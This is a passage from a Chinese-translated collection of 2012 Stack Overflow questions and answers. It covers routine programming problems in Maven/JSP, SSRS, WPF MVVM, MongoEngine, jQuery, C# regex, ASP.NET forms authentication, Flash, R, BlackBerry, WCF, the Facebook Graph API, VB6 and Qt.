} 
```

# java - 使用 Maven 和 Eclipse 制作我的第一个 web 项目时遇到问题

> ID：12392354
> 
> 赞同：0
> 
> 时间：2012-09-12T16:10:14.590
> 
> 标签：java, eclipse, spring, maven

我在使用 Maven 和 Eclipse 制作我的第一个 web 项目时遇到了问题......

我是使用 maven 的新手，我正在努力学习它。我一直在使用 Eclipse 和 Coding Web 和 Spring 项目，但从未使用过 maven，所以我想学习它。

我在eclipse中使用archetype创建新的maven项目：maven-archetype-webapp 然后我对我的POM.XML进行更改以具有以下内容：

```
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>org.springsource.greenbeans.maven</groupId>
    <artifactId>WebFlowTemplate</artifactId>
    <packaging>war</packaging>
    <version>0.0.1-SNAPSHOT</version>
    <name>WebFlowTemplate Maven Webapp</name>
    <url>http://maven.apache.org</url>
    <dependencies>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>3.8.1</version>
            <scope>test</scope>
        </dependency>

        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-context</artifactId>
            <version>3.1.2.RELEASE</version>
        </dependency>

        <dependency>
            <groupId>org.springframework.webflow</groupId>
            <artifactId>spring-webflow</artifactId>
            <version>2.3.1.RELEASE</version>
        </dependency>

        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-core</artifactId>
            <version>3.1.2.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-web</artifactId>
            <version>3.1.2.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-config</artifactId>
            <version>3.1.2.RELEASE</version>
        </dependency>

        <dependency>
            <groupId>log4j</groupId>
            <artifactId>log4j</artifactId>
            <version>1.2.17</version>
        </dependency>

    </dependencies>
    <build>
        <finalName>WebFlowTemplate</finalName>
    </build>
</project> 
```

然后我做了一个小的 index.jsp 来测试：

```
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt"%>

<html>
<head>
    <title>Spring 3.0 MVC Series</title>
</head>
<body>
    <a href="login.jsp">Login</a><p><p>
    <a href="hello.html">Say Hello (Spring MVC)</a><p>
    <a href="./helloworld">Say Hello (Spring-Web-Flow)</a>
</body>
</html> 
```

但我在 taglib 行上遇到错误：

说明 资源路径 位置 类型

```
Can not find the tag library descriptor for "http://java.sun.com/jsp/jstl/core" input.jsp   /WebFlowTemplate/src/main/webapp/WEB-INF/flows/helloworld   line 1  JSP Problem 
```

为什么 JSP 找不到标签库？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:17:20.113

jstl 的 URI 应该类似于：

```
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %> 
```

有关更多信息，请参阅[此处](http://www.mularien.com/blog/2008/04/24/how-to-reference-and-use-jstl-in-your-web-application/)的讨论。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:17:22.953

您需要将 servlet api 添加为依赖项并将其标记为已提供。或者查找 maven taglib 依赖项：

```
<dependency>
    <groupId>jstl</groupId>
    <artifactId>jstl</artifactId>
    <version>1.2</version>
</dependency> 
```

# asp.net - 当我从 Web 服务获取数据时在 SSRS 中使用 ElementPath 时，我没有得到任何结果

> ID：12392358
> 
> 赞同：1
> 
> 时间：2012-09-12T16:10:43.633
> 
> 标签：asp.net, web-services, reporting-services, web, ssrs-2008

我创建了一个 Web 服务，它返回一个我手动填充数据的数据集。当我启动服务并获得结果时，这是我返回的 XML。

```
<DataSet>
  <xs:schema id="Results">
    <xs:element name="Results" msdata:IsDataSet="true" msdata:UseCurrentLocale="true">
      <xs:complexType>
        <xs:choice minOccurs="0" maxOccurs="unbounded">
          <xs:element name="BillInfo">
            <xs:complexType>
              <xs:sequence>
                <xs:element name="AccountType" type="xs:string" minOccurs="0"/>
                <xs:element name="AccountNumber" type="xs:string" minOccurs="0"/>
                <xs:element name="AmountDue" type="xs:decimal" minOccurs="0"/>
                <xs:element name="BillDescription" type="xs:string" minOccurs="0"/>
                <xs:element name="DaysTilDue" type="xs:int" minOccurs="0"/>
              </xs:sequence>
            </xs:complexType>
          </xs:element>
        </xs:choice>
      </xs:complexType>
    </xs:element>
  </xs:schema>

  <diffgr:diffgram>
    <Results>
      <BillInfo diffgr:id="BillInfo1" msdata:rowOrder="0" diffgr:hasChanges="inserted">
        <AccountType>PP</AccountType>
        <AccountNumber>1</AccountNumber>
        <AmountDue>307.6500</AmountDue>
        <BillDescription>Bill Number 20121</BillDescription>
        <DaysTilDue>-362</DaysTilDue>
      </BillInfo>
      <BillInfo diffgr:id="BillInfo2" msdata:rowOrder="1" diffgr:hasChanges="inserted">
        <AccountType>PP</AccountType>
        <AccountNumber>1</AccountNumber>
        <AmountDue>307.6500</AmountDue>
        <BillDescription>Bill Number 20121</BillDescription>
        <DaysTilDue>-362</DaysTilDue>
      </BillInfo>
    </Results>
  </diffgr:diffgram>
</DataSet> 
```

如果我没有设置元素路径并尝试将我的 SSRS 数据集设置为等于结果，我会得到作为信息返回的架构。每当我尝试输入元素路径时，我都没有得到任何结果。我不确定我做错了什么。下面我展示了我正在使用的查询，包括 ElementPath 来加载我的 SSRS 数据集

```
<Query>
    <SoapAction>http://tempuri.org/GetBillData</SoapAction>
    <Method Namespace="http://tempuri.org/" Name="GetBillData" />
      <Parameters>
        <Parameter Name="PartyID">
          <DefaultValue>0</DefaultValue>
        </Parameter>
      </Parameters>
    <ElementPath IgnoreNamespaces="True"> DataSet {}/ diffgram {}/ Results {}/BillInfo</ElementPath>
</Query> 
```

如果有人知道我做错了什么，我很想听听。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-12-10T12:40:10.300

这将使它肯定工作。一切都是正确的语法

```
<Query>
<Method Name="GetBillData" Namespace="http://tempuri.org/" >
<Parameters>
<Parameter Name="PartyID">
<DefaultValue>0</DefaultValue>
</Parameter>
</Parameters>
</Method>
<ElementPath IgnoreNamespaces="True">
GetBillDataResponse/GetBillDataResult/diffgram/Results/BillInfo
</ElementPath>
<SoapAction>http://tempuri.org/GetBillData</SoapAction>
</Query> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T09:06:25.487

如果我没记错的话，“ElementPath”必须像这样开始：GetBillDataResponse{}/GetBillDataResult{}/DataSet{}/diffgram{}... [Fiddler](http://www.fiddler2.com/fiddler2/)可以帮助您了解数据结构。

# c# - WPF 中的视图和视图模型

> ID：12392360
> 
> 赞同：0
> 
> 时间：2012-09-12T16:10:52.730
> 
> 标签：c#, wpf, mvvm, viewmodel, backgroundworker

我一直在 WPF 中搞乱 MVVM，并有一个快速的问题要问人们。现在我有：

*   MainWindow 由 MenuBar 和 UserControl 组成
*   UserControl（上面提到的）基本上包含一个网格。

我根据需要在 UserControl 中公开对 Grid Properties 的访问，但 User Control 一无所知，也不与 MainWindow 交互。

我还有一个名为 ViewModel 的类，它为我操作 MainWindow/UserControl。我的理解是 ViewModel 知道 View (MainWindow/UserControl) 以及如何操作它，而 View 通常对 ViewModel 一无所知。

如果我有这个权利，这是我的问题：

1.  当我在 MainWindow MenuBar 上单击按钮时，我想执行操作。现在，这些动作必然会在 MainWindow 中说一个 EventHandler，而 EventHandler 实例化 ViewModel 并调用处理方法，如下所示：

    ```
    private void RunQueryMenuItemAdvClick(object pSender, RoutedEventArgs pRoutedEventArgs)
    {
        ViewModel vViewModel = new ViewModel(this);
        vViewModel.RunQuery();
    } 
    ```

视图模型看起来像这样：

```
 public class ViewModel
{
    private DataProvider fDataProvider;

    private MainWindow fMainWindow;

    private BackgroundWorker fQueryWorker = new BackgroundWorker();

    public ViewModel(MainWindow pMainWindow)
    {
        fDataProvider = new DataProvider();
        fMainWindow = pMainWindow;

        //Query Worker
        fQueryWorker.DoWork += QueryWorkerDoWork;
        fQueryWorker.RunWorkerCompleted += QueryWorkerCompleted;
    }

    private void QueryWorkerCompleted(object pSender, RunWorkerCompletedEventArgs pRunWorkerCompletedEventArgs)
    {
        fMainWindow.UserControl_Data.busyIndicator1.IsBusy = false;
        fMainWindow.UserControl_Data.DataToPresent = pRunWorkerCompletedEventArgs.Result;
    }

    private void QueryWorkerDoWork(object pSender, DoWorkEventArgs pDoWorkEventArgs)
    {
        pDoWorkEventArgs.Result = this.fDataProvider.GetParticipantsData();
    }

    public void RunQuery()
    {
        if (!fQueryWorker.IsBusy)
        {
            fMainWindow.UserControl_Data.busyIndicator1.IsBusy = true;
            fQueryWorker.RunWorkerAsync();
        }
    }
} 
```

我在这里的方法是否离谱？

***编辑新解决方案：*** 首先，感谢大家的回复。我想提供我的新解决方案。这可能不是 100% 的 MVVM，但它必须比我所拥有的至少好 80%！

我的视图模型：

```
 public class ViewModel : ObservableObject
{
    private DataProvider fDataProvider;

    private BackgroundWorker fQueryWorker = new BackgroundWorker();

    public ViewModel()
    {
        fDataProvider = new DataProvider();

        //Query Worker
        fQueryWorker.DoWork += QueryWorkerDoWork;
        fQueryWorker.RunWorkerCompleted += QueryWorkerCompleted;
    }

    //This is my Command for the MainWindow.MenuItem to bind to to run a query
    RelayCommand fRunQueryCommand;
    public ICommand RunQueryCommand
    {
        get
        {
            if (this.fRunQueryCommand == null)
            {
                this.fRunQueryCommand = new RelayCommand(param => this.RunQuery(),
                    param => true);
            }
            return this.fRunQueryCommand;
        }
    }

    //This is my Property for the UserControl.progressBar to bind to
    private bool fIsBusy;
    public bool IsBusy
    {
        get { return this.fIsBusy; }
        set
        {
            if (value != this.fIsBusy)
            {
                this.fIsBusy = value;
                OnPropertyChanged("IsBusy");
            }
        }
    }

    //This is my Property for the UserControl.gridControl.ItemSource to bind to
    private object fSource;
    public object Source
    {
        get { return this.fSource; }
        set
        {
            if (value != this.fSource)
            {
                this.fSource = value;
                OnPropertyChanged("Source");
            }
        }
    }

    private void QueryWorkerCompleted(object pSender, RunWorkerCompletedEventArgs pRunWorkerCompletedEventArgs)
    {
        this.IsBusy = false;
        Source = pRunWorkerCompletedEventArgs.Result;
    }

    private void QueryWorkerDoWork(object pSender, DoWorkEventArgs pDoWorkEventArgs)
    {
        pDoWorkEventArgs.Result = this.fDataProvider.GetParticipantsData();
    }

    public void RunQuery()
    {
        if (!fQueryWorker.IsBusy)
        {
            this.IsBusy = true;
            fQueryWorker.RunWorkerAsync();
        }
    } 
```

我已经从 MainWindow 和 UserControl 后面删除了我的所有代码，并将其替换为 XAML，以便将我需要的元素绑定到 ViewModel 和 1 命令中的两个属性。随时提供关于我可能会或可能不会通过重构获得的额外反馈。（除了缺少模型用法）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-12T16:29:41.347

你在这里**太**离谱了。

1.  反过来说：View 知道 ViewModel，而 ViewModel 对 View 一无所知。
    在 ViewModel 中引用 MainWindow 和 UserControl 绝不是*MVVM*。

2.  当您使用 MVVM 时，您通常没有点击处理程序。

处理这种情况的正确方法如下：

*   将 ViewModel 中的 ICommand 公开为属性。MainWindow 可以将其按钮绑定到该命令。
*   当在 ViewModel 中调用命令时，执行`RunQuery`，但您只需将`IsBusy` *ViewModel*设置 为 true。UserControl 反过来将绑定到该属性。

所有这些都通过将`DataContext`View 设置为 ViewModel 的实例来实现。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T16:35:51.527

Daniel 是正确的，您似乎误解了 MVVM 设计模式，并且您`ViewModels`永远不应该实际引用任何 UI 对象。

我能想到的描述模式的最佳方式是，您`ViewModels`是您的实际应用程序，您`Models`是您的数据对象，您`Views`只是一种用户友好的方式，让用户与您的`ViewModels`. 在一个完美的世界中，您可以完全使用测试脚本运行您的应用程序，而根本不使用 View 层。

例如，您的 ViewModel 是您的应用程序，因此它可能有一个`List<ICommand> MenuCommands`, 每个`ICommand`都是一个`RelayCommand`or `DelegateCommand`，它指向您代码中的一个方法，以及一个布尔`IsBusy`属性。

`<Menu>`您的视图（窗口）通过将您绑定到集合来简单地反映您的 ViewModel `MenuCommands`，并且可能显示一些基于`IsBusy`布尔值的加载图形。

如果您有兴趣从头到尾查看一个简单的 MVVM 示例[，我的博客上](http://rachel53461.wordpress.com/2011/05/08/simplemvvmexample/)有一个相当基本的 MVVM 示例

# python - EmbeddedDocument 中的 MongoEngine ListField 在验证时抛出 TypeError

> ID：12392362
> 
> 赞同：11
> 
> 时间：2012-09-12T16:10:57.390
> 
> 标签：python, mongodb, typeerror, mongoengine

我不确定这是 MongoEngine 中的错误还是我错过了什么。我设置了以下模型：

```
class Features(EmbeddedDocument):
    version = FloatField()
    data = ListField(StringField)

class Article(Document):
    vendor = ReferenceField(Vendor)
    url = URLField()
    author = StringField()
    clean_content = StringField()
    features = EmbeddedDocumentField(Features) 
```

当我像这样测试我的模型时：

```
#add vendor
vendor = Vendor(name="techcrunch", config="vendor config")
vendor.save()

#create features
features = Features(version = 1.0)
features.data = ["5", "89"]

#add article
article = Article(vendor = vendor, url ="http://www.techcrunch.com", 
                  author ="MG Siegler", clean_content = "Apple rocks!")
article.features = features
article.save() 
```

我收到以下错误：

```
TypeError: unbound method _validate() must be called with StringField instance as first argument (got str instance instead) 
```

有人可以解释一下吗？

编辑：

没关系。我发现了我的错误。

它一定要是：

```
class Features(EmbeddedDocument):
    version = FloatField()
    data = ListField(StringField()) 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-09-19T22:34:15.367

我发现了错误。

它一定要是：

```
class Features(EmbeddedDocument):
    version = FloatField()
    data = ListField(StringField()) 
```

# jquery - 单选按钮选中显示 div

> ID：12392363
> 
> 赞同：0
> 
> 时间：2012-09-12T16:10:59.253
> 
> 标签：jquery, jquery-selectors, radio-button, html-input

我有这个代码：

```
<div style="padding-bottom:11px;">

<input class="radio" type="radio" value=" join our table" name="Choose:">
<label class="optionLabel"> join our table</label>

</div> 
```

我想要做的是当一个单选按钮被选中以显示一个 div 时，类似于工具提示。

问题是我不知道如何检测单选按钮何时被选中。

欢迎任何建议。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:14:39.807

要检测单选输入元素上的单击或更改事件并显示`div`响应：

```
$('input:radio').click(
    function(e){
        if ($(this).is(':checked')){
            $(selectorForRelevantDivElement).show();
        }
    }); 
```

或者：

```
$('input:radio').change(
    function(e){
        if ($(this).is(':checked')){
            $(selectorForRelevantDivElement).show();
        }
    }); 
```

您还可以使用该`on()`方法，并绑定到无线电输入的祖先元素（这用于将事件处理分配给动态创建的元素）：

```
$('form').on('change click', 'input:radio', function(e){
        console.log(e.type); // shows the event, whether 'click' or 'change'
        if ($(this).is(':checked')){
            $(selectorForRelevantDivElement).show();
        }
    }); 
```

参考：

*   [`change()`](http://api.jquery.com/change/).
*   [`click()`](http://api.jquery.com/click/).
*   [`on()`](http://api.jquery.com/on/).
*   [`show()`](http://api.jquery.com/show/).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:15:20.453

您想要 jQuery 更改事件处理程序。像这样的东西：

```
$(".radio").change(function(e){
    // create your div here
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-12T16:30:43.483

您可以将 click 事件用于 radioButton.. 甚至是 Change 事件..

```
$(function() {
    $('.radio').on('click', function(){
        $('.a').show();        
    });
});​ 
```

检查这个[更新的小提琴](http://jsfiddle.net/sushanth009/FhCZV/9/)

您可以通过多种方式选择 radioButton

```
$('.radio').on('click', function(){

$('input[type=radio]').on('click', function(){ 
```

[动态元素小提琴](http://jsfiddle.net/sushanth009/FhCZV/11/)

# c# - 需要帮助创建一个匹配某些包含 json 的 c# 字符串的正则表达式

> ID：12392365
> 
> 赞同：0
> 
> 时间：2012-09-12T16:11:00.780
> 
> 标签：c#, regex, json

我在 C# 中有一堆 Json 样式字符串，我正在尝试获取实际在 CS 文件中的原始字符串并将其转换为 string.format 以帮助参数化 Web 请求。

到目前为止，我还没有想出可行的方法。

我需要一个匹配这两个字符串的正则表达式：

```
 "{\"effectiveTimestamp\":null 
```

`\"foo\":1029231}");`

我的正则表达式如下所示

`\s*\"?{?(.*?):(.*)(?:}\"\);)?`

对于最后 2 个捕获组，我尝试了不同的贪婪和非贪婪变体。

`\s*\"?{?(.*?):(.*)(?:}\"\);)*`

`\s*\"?{?(.*?):(.*)(?:}\"\);)*?`

`\s*\"?{?(.*?):(.*?)(?:}\"\);)*`

`\s*\"?{?(.*?):(.*?)(?:}\"\);)*?`

以及尝试匹配 0 或 1 次

`\s*\"?{?(.*?):(.*)(?:}\"\);)?`

但无论我做什么，它都无法抓住第一串或第二串中的第二组。在这两种情况下，我都无法正确抓住第二组。

从马特那里得到答案：

这捕获了我需要的东西。

`([\w\\"]*):([\w\\"]+)`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:17:45.060

[这个](http://regexr.com?324kf)怎么样？

```
(\w+)\\?\"\s*\:\s*(\w+) 
```

在这里很难说出你想要什么，你能给我们举个例子，说明你希望在比赛中看到哪些小组吗？

# asp.net - 如何在 ASP.NET 中将表单身份验证与其他表单身份验证模式（如一次性密码）混合使用？

> ID：12392367
> 
> 赞同：1
> 
> 时间：2012-09-12T16:11:07.627
> 
> 标签：asp.net, authentication

我尝试使用另一种使用用户名和一次性密码进行身份验证的选项来实现经典表单身份验证模式。

所以我有 Login.aspx 和 LoginOTP.aspx

在 LoginOTP 中，我使用 response.redirect 到 Default.aspx 问题是 asp.net 重定向到 Login.aspx，因为它认为用户没有经过经典身份验证。

那么如何实现该业务用例呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:43:00.483

我假设您拥有相同的用户群，但有时您希望他们一次性登录（例如用于密码重置）而其他时候只是正常登录？

如果是这样，对于 OTP，一旦您验证了 OTP，您就可以使用该`FormsAuthentication.SetAuthCookie()`方法登录，而无需验证其正常密码。例如

```
FormsAuthentication.SetAuthCookie("userA", false); 
```

在上面的示例中，用户使用用户名“userA”登录，并且`false`是是否跨会话保持登录（例如是否勾选了“记住我”之类的内容）

该方法的文档`FormsAuthentication.SetAuthCookie()`可以在这里找到：http: [//msdn.microsoft.com/en-us/library/system.web.security.formsauthentication.setauthcookie.aspx](http://msdn.microsoft.com/en-us/library/system.web.security.formsauthentication.setauthcookie.aspx)

# actionscript-3 - 绘图游戏Flash AS3

> ID：12392369
> 
> 赞同：5
> 
> 时间：2012-09-12T16:11:13.430
> 
> 标签：actionscript-3, flash, drawing

我在使用 Flash 中的游戏时遇到了问题，我不知道我想让它成为可能与否。

我正在尝试使用 AS3 在 Flash 中为孩子们制作游戏，孩子必须在其中绘制与当前舞台上的形状相似的形状。例如，有一个“a”字母，孩子必须画出类似的东西。

我的问题是，是否有办法检查孩子画的形状是否与舞台上的形状相似，我该如何做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:52:27.307

我会拍摄这两个图像并将它们缩小到低得多的分辨率……比如 16 x 16 左右的网格。将网格中的每个点标记为打开或关闭（绘制或未绘制）。

然后相互叠加，看看有多少点设置在一个而不是另一个。如果超过阈值，则将其标记为不匹配。

您可以通过缩放绘制的图像来改进算法。找到两者中最顶部和最底部的绘制像素，并缩放绘制的图像以匹配第一张图像。你可以对宽度做同样的事情。这样，玩家就不会因为画出好的但更小版本的图片而受到惩罚。

另一个改进是进行多重比较，将绘制的图像从左到右、上下移动，采用“最佳”匹配。这样你就不会因为从中心画一些东西而受到惩罚。

这有点老套，但我认为走这条路可能比尝试合并逻辑来解析笔画和其他基于 OCR 或基于手势的算法更有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:15:41.897

对的，这是可能的。

您可能想要跟踪鼠标的 x,y 坐标（如果使用鼠标绘制），然后将值转换为与之匹配的形状。

然后进行某种错误检查。例如将玩家绘制的形状的面积大小与给定的形状和其他东西进行比较。

另一个可能是绘制的线之间的角度和它们的平均值。我认为画了多少条线等等会很好。

您可以通过检查像素颜色并定义有绘图的位置和没有绘图的位置（即白色背景）来实现这一点。

希望这可以帮助。

# javascript - 如何检查数组的对象是否等于选项值

> ID：12392372
> 
> 赞同：0
> 
> 时间：2012-09-12T16:11:31.813
> 
> 标签：javascript, jquery, drop-down-menu

我在带有未知数量选项的表单上有以下选择框：

```
<select>
   <option value="v1">v1</option>
   <option value="v2">va2</option>
   <option value="v3">va3</option>
   <option value="v11">v11</option>
   <option value="v12">va12</option>
   <option value="v13">va13</option>
</select>​ 
```

我在javascript中定义了以下数组：

```
var checkValArray = ['v1', 'v2', 'v13']; 
```

我想做的是浏览选择框的每个选项，看看我的数组的元素是否等于它。

将其付诸实践的最佳方法是什么？

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:14:45.690

有一个非常有用的 jQuery API 方法：[$.inArray](http://api.jquery.com/jQuery.inArray/)。所以它应该是这样的：

```
var optionValue = $('select option:selected').val();
if ($.inArray(optionValue, checkValArray) !== -1) {
  // it's in
}
else {
  // it's not
} 
```

对于多选，它可以与类似...

```
$('select option:selected').each(function() {
   if ($.inArray(this.value, checkValArray) !== -1) { ... }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:21:45.540

```
$('select option').each(function() {
  if ($.inArray($(this).val(),checkValArray)>-1) {
    // do something
  }
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-12T16:21:55.907

您可以使用 $.inArray 方法来实现这一点

```
var checkValArray = ['v1', 'v2', 'v13'];

var options = $('select option');

$.each(options , function(i){
    if($.inArray( $(this).val() , checkValArray) > -1){
       alert('Match Found');
    }
}); 
```

检查[FIDDLE](http://jsfiddle.net/sushanth009/wQbPP/) </p>

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-12T16:24:51.053

这是一个没有 jQuery 的解决方案：

```
var selectitems = document.getElementsByTagName("select")[0];
var items = selectitems.getElementsByTagName("option");
alert(items.length);
for(var i = 0; i < items.length; i++)
{
    alert(items[i].innerHTML);
} 
```

​</p>

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-12T16:21:47.287

这应该可以解决问题

```
var selectedArray = $("select#yourselectid").val();
var equal = $.extend($.extend([], checkValArray), selectedArray).length == checkValArray.length; 
```

# r - 小波分析的数据频率

> ID：12392375
> 
> 赞同：0
> 
> 时间：2012-09-12T16:11:42.433
> 
> 标签：r, wavelet, biwavelet

在以下示例中：

```
require(biwavelet)
t <- seq(1/24, 365, 1/24)
A <- 10
fs <- 1/24
y <- A + sin(2*pi*fs*t)

d <- cbind(t, y + rnorm(length(y))) 
wt.t1 <- wt(d)
plot(wt.t1) 
```

如果我正在查看给定时间序列的昼夜周期，可以使用的最低分辨率是多少？此示例当前使用以 1 小时为间隔测量的数据，因此我一天有 24 个数据点。如果我使用 2,3 甚至 4 小时的时间步长，这是否同样重要？

还有一种方法可以计算在降低数据分辨率时结果的重要性是否会发生变化

# mobile - windows Vista中的黑莓手机开发

> ID：12392376
> 
> 赞同：0
> 
> 时间：2012-09-12T16:11:43.290
> 
> 标签：mobile, blackberry, blackberry-eclipse-plugin

谁能告诉我是否有在 Windows Vista 中开发黑莓手机应用程序的方法？我需要为黑莓 OS 7 和 6 开发应用程序。我一直在尝试安装 eclipse java 插件。它在 Windows XP 和 7 中运行良好，但在 Vista 中无法正常工作。是否有任何其他跨平台工具可用于在 Vista 中开发？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T17:54:17.140

按着这些次序：

1.  下载[BlackBerry JDE](https://developer.blackberry.com/java/download/jde)并安装它。
2.  [下载黑莓蚂蚁工具](http://bb-ant-tools.sourceforge.net)
3.  下载[Eclipse（没有 JDE 插件）](http://www.eclipse.org)或[Netbeans](http://www.netbeans.org)并安装它。

现在使用 Apache Ant（Eclipse/Netbeans 附带），并[使用 BlackBerry Ant Tools](http://bb-ant-tools.sourceforge.net/docs)。

在您的构建文件中，为 ant 任务指定特定 ant 任务所需的`rapc.exe`（编译器）、 （主 sdk 库）和其他 JDE 组件的路径。`net_rim_api.lib`

并使用模拟器构建您的 BlackBerry 应用程序文件、对其进行签名、打包和启动。BB Ant Tools 支持它。

# wcf - 将 WCF 服务代理注入视图模型

> ID：12392380
> 
> 赞同：0
> 
> 时间：2012-09-12T16:11:59.450
> 
> 标签：wcf, silverlight, silverlight-4.0, dependency-injection, prism-4

我目前有一个使用 Prism 和 MEF 的 Silverlight 应用程序。我在此应用程序中连接到多个 WCF 服务，但使用“控制器”类来保存实例化的客户端生成的服务代理对象。

我想要做的是将服务引用注入到这个控制器中（就像我目前对 IEventAggregator 所做的那样）。我不确定该怎么做。我是否需要创建一个实现服务契约接口并持有对服务代理对象的引用的包装类？

我现在应该做什么：

```
/// <summary>
/// WCF client used to communitcate with the data WCF service
/// </summary>
private DataClient _dataClient;  // DataClient is the client generated object from a service reference

/// <summary>
/// Region manager for the application
/// </summary>
private IRegionManager _manager;

/// <summary>
/// Application event aggregator
/// </summary>
private IEventAggregator _eventAggregator;

/// <summary>
/// Constructor. Initializes the statistics controller, hooks up all services, and initializes all commands.
/// </summary>
/// <param name="manager"></param>
[ImportingConstructor]
public ZOpportunityController(IRegionManager manager, IEventAggregator events)
{
    _manager = manager;
    _eventAggregator = events;

    //hookup a WCF service used to retrive GP data
    _dataClient = new ZellerGpDataClient();  
    _dataClient.OpenCompleted += new EventHandler<AsyncCompletedEventArgs>(_dataClient_openCompleted);
    _dataClient.GetCustomersCompleted += new EventHandler<GetCustomersCompletedEventArgs>(_dataClient_GetCustomersCompleted);
    _dataClient.OpenAsync();
} 
```

正如您在此处看到的，我在控制器构造函数中连接到服务，但我只想将服务对象注入控制器，就像使用 IRegionManager 和 IEventAggregator 一样。

**编辑：** [这篇博文](http://blogs.southworks.net/gmaliandi/2011/10/using-wcf-services-in-prism-silverlight-applications/)确实是我想要完成的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:31:15.777

从您的服务合同中派生一个客户[`ClientBase<TChannel>`](http://msdn.microsoft.com/en-us/library/ms576141%28v=vs.95%29.aspx)并使其实施。合约的实现看起来与此类似：

```
public class MyClient : ClientBase<IMyService>, IMyService
{
  void IMyService.DoSomething(Foo bar)
  {
    this.Channel.DoSomething(bar);
  }
} 
```

现在，您可以使用 MEF 或任何其他容器注册该实现，并通过构造函数注入它。

# facebook-graph-api - 不支持实时更新 include_values

> ID：12392381
> 
> 赞同：3
> 
> 时间：2012-09-12T16:12:01.307
> 
> 标签：facebook-graph-api, subscriptions, real-time-updates

我想更新“callback_url”（https://graph.facebook.com/subscriptions），但问题是我无法添加“include_values”，这是一个非常大的问题，因为我的整个程序都可以使用

{ "error": { "message": "(#100) include_values is not supported", "type": "OAuthException", "code": 100 } }

**带有“include_values”的 Facebook 回调示例**

{"object":"user","entry":[{"id":"44368442315","time":1346984937,"changes":[{"field":"feed","value":{"item ":"like","verb":"add","parent_id":"44368442315_10151242317912316","sender_id":1422826573,"created_time":1346984937}}]}]}

**示例 facebook 回调不是“include_values”**

{"object":"user","entry":[{"id":"329196660309","time":1347472236,"changed_fields":["feed"]},{"id":"44368442315","时间":1347472238,"changed_fields":["feed"]}]}

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T22:58:08.757

此属性不受支持，并且正确地未记录在案。所需的模式是查询返回以获取更新的字段，在 ping 中明确标记。

事实上，在某些情况下，这样做是最佳的：例如，批处理查询以获得在一段时间内对快速移动属性进行的所有更改的最终状态。

请注意，您现在可以使用[字段扩展](https://developers.facebook.com/docs/reference/api/field_expansion/ "领域扩展")来聚焦结果查询和所需的任何嵌套连接。

# vb6 - VB 6.0 中的远程系统 CPU 和 RAM 使用情况

> ID：12392384
> 
> 赞同：-2
> 
> 时间：2012-09-12T16:12:06.597
> 
> 标签：vb6

您能否建议如何在 VB 6.0 中检索远程系统 CPU 和 RAM 使用情况？我需要使用 vb6.0 检索远程系统 CPU 使用情况和 ram 性能。请提供帮助。

提前致谢 ......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:56:14.397

您可以[使用 DCOM 创建客户端/服务器应用程序](http://support.microsoft.com/kb/266717/en-us?fr=1 "如何使用 Visual Basic 创建 DCOM 客户端/服务器应用程序")。服务器应用程序可以[从 Windows API 获取信息](http://support.microsoft.com/kb/213267 "如何：从 Excel 2000 中的 Windows API 获取 Windows 状态信息")。

# c++ - QtableWidget：如何在特定列中查找值

> ID：12392395
> 
> 赞同：4
> 
> 时间：2012-09-12T16:12:29.440
> 
> 标签：c++, qt, qt4

我需要使用 qtablewidget 检查特定值是否在特定列中。在我的情况下，我需要检查第一列是否已经存在 ID，如果是，我需要包含行的编号来更新该行，否则我想添加该行。QT有没有提供任何解决方案来检查列或shou

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-12T17:25:52.787

我假设您正在第一列中寻找您的值（这就是为什么 item(int,int) 中的第二个参数是 0）并且表名是 myQTableWidget

```
int rows = myQTableWidget->rowCount();
bool found = false;
for(int i = 0; i < rows; ++i)
{
    if(myQTableWidget->item(i, 0)->text() == "Something")
    {
        //we have found our value so we can update 'i' row
        found = true;
        break;
    }
}
if(!found)
{
    //we didn't find our value, so we can insert row
} 
```

# html - 空白：nowrap 打破显示：表

> ID：12392396
> 
> 赞同：5
> 
> 时间：2012-09-12T16:12:32.373
> 
> 标签：html, css, gallery, vertical-scrolling, nowrap

